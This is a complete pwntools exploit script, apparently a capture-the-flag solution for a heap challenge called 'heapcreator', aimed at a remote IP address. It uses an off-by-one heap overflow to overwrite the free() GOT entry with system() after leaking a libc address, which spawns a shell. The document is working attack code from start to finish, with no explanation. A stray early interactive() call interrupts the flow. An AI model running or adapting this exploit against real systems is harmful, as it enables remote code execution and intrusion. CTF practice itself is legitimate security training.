from pwn import *
context.terminal = ['terminator','-x','sh','-c']
p = process('./heapcreator')
p=remote("47.115.24.144",10000)
#p=remote("node3.buuoj.cn",29112)
elf = ELF('./heapcreator')
libc = ELF('/libc-2.23.so')

def create(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.sendline(content)

def edit(idx, content):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))
    p.recvuntil(":")
    p.sendline(content)

def show(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil(":")
    p.sendline("4")
    p.recvuntil(":")
    p.sendline(str(idx))

free_got = 0x602018
create(0x18,"aaaa")
create(0x10,"bbbb")
pause()

payload = "/bin/sh\x00" + "a"*0x10 + '\x41'
edit(0,payload)
pause()
delete(1)
payload = p64(0)*4 +p64(0x30)+ p64(free_got)
create(0x30,payload)
show(1)
p.interactive()

free_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
#free_addr = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
libc_base = free_addr - libc.sym['free']
system_addr = libc_base + libc.sym['system']
log.success("free_addr==>" + hex(free_addr))
log.success("system_addr==>" + hex(system_addr))
payload = p64(system_addr)
edit(1,payload)
delete(0)
#gdb.attach(p)
p.interactive()
